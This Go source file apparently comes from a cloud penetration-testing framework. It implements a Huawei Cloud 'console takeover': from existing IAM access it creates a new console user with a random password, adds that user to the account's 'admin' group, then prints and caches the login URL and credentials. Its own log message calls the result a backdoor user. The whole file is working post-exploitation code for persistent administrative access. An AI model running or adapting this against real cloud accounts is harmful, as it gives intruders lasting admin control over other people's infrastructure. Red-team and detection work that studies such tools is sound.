package huaweiconsole

import (
	"github.com/teamssix/cf/pkg/util/errutil"
	"os"
	"strings"

	iamModel "github.com/huaweicloud/huaweicloud-sdk-go-v3/services/iam/v3/model"
	log "github.com/sirupsen/logrus"
	"github.com/teamssix/cf/pkg/cloud"
	"github.com/teamssix/cf/pkg/util"
	"github.com/teamssix/cf/pkg/util/database"
)

func CreateUser(userName string, password string, domainId string) string {
	accessModeUser := "console"
	enabledUser := true
	pwdStatusUser := false
	createUserRequestContent := &iamModel.CreateUserRequest{}
	userbody := &iamModel.CreateUserOption{
		AccessMode: &accessModeUser,
		Name:       userName,
		DomainId:   domainId,
		Password:   &password,
		Enabled:    &enabledUser,
		PwdStatus:  &pwdStatusUser,
	}
	createUserRequestContent.Body = &iamModel.CreateUserRequestBody{
		User: userbody,
	}
	createUserRequestResponse, err := IAMClient().CreateUser(createUserRequestContent)
	if err == nil {
		log.Debugf("创建 %s 用户成功 (Create %s user successfully)", userName, userName)
	} else {
		if strings.Contains(err.Error(), "1109") {
			log.Warnf("%s 用户已存在，无法接管，请指定其他的用户名 (%s user already exists and cannot take over, please specify another user name.)", userName, userName)
			os.Exit(0)
		}
	}
	newUserId := createUserRequestResponse.User.Id

	return newUserId
}

func getDomainId() ([]string, []string) {
	keystoneListAuthDomainsRequestContent := &iamModel.KeystoneListAuthDomainsRequest{}
	keystoneListAuthDomainsRequestResponse, err := IAMClient().KeystoneListAuthDomains(keystoneListAuthDomainsRequestContent)
	errutil.HandleErrNoExit(err)
	domains := keystoneListAuthDomainsRequestResponse.Domains
	domainsId := []string{}
	domainsName := []string{}
	for _, domain := range *domains {
		domainsId = append(domainsId, domain.Id)
		domainsName = append(domainsName, domain.Name)
		log.Debugf("查询 IAM 用户可以访问到的账户为 %s  (The domain to get the current user is %s)", domain.Name, domain.Name)
	}
	return domainsId, domainsName
}

func getUserGroup(domainId string) string {
	// 查找当前用户所在的用户组的ID
	keystoneListGroupsRequestContent := &iamModel.KeystoneListGroupsRequest{}
	keystoneListGroupsRequestContent.DomainId = &domainId
	keystoneListGroupsRequestResponse, err := IAMClient().KeystoneListGroups(keystoneListGroupsRequestContent)
	errutil.HandleErrNoExit(err)

	groups := keystoneListGroupsRequestResponse.Groups
	var groupId string
	for _, group := range *groups {
		if group.Name == "admin" {
			log.Debugf("获得到 admin 用户组的 ID 为 %s (The admin user group ID is %s)", group.Id, group.Id)
			groupId = group.Id
		}
	}
	return groupId
}

func AddUserToGroup(userName string, userId string, groupId string) {
	keystoneAddUserToGroupRequestContent := &iamModel.KeystoneAddUserToGroupRequest{}
	keystoneAddUserToGroupRequestContent.GroupId = groupId
	keystoneAddUserToGroupRequestContent.UserId = userId
	_, err := IAMClient().KeystoneAddUserToGroup(keystoneAddUserToGroupRequestContent)
	if err != nil {
		errutil.HandleErrNoExit(err)
	} else {
		log.Debugf("成功为 %s 用户赋予管理员权限 (Successfully grant AdministratorAccess policy to the %s user)", userName, userName)
	}
}

func TakeoverConsole(userName string) {
	// 创建用户
	password := util.GenerateRandomPasswords()
	domainId, domainName := getDomainId()
	userId := CreateUser(userName, password, domainId[0])
	// 获取 admin 用户组 ID
	groupId := getUserGroup(domainId[0])
	AddUserToGroup(userName, userId, groupId)
	loginURL := "https://auth.huaweicloud.com/authui/login?id=" + domainName[0]
	data := [][]string{
		{userName, password, loginURL},
	}
	database.InsertTakeoverConsoleCache("huawei", userId, userName, password, loginURL)
	var header = []string{"用户名 (User Name)", "密码 (Password)", "控制台登录地址 (Login Url)"}
	var td = cloud.TableData{Header: header, Body: data}
	cloud.PrintTable(td, "")
	log.Infof("接管控制台成功，接管控制台会创建 %s 后门用户，如果想删除该后门用户，请执行 cf huawei console cancel 命令。(Successfully take over the console. Since taking over the console creates the backdoor user %s , if you want to delete the backdoor user, execute the command cf huawei console cancel.)", userName, userName)
}
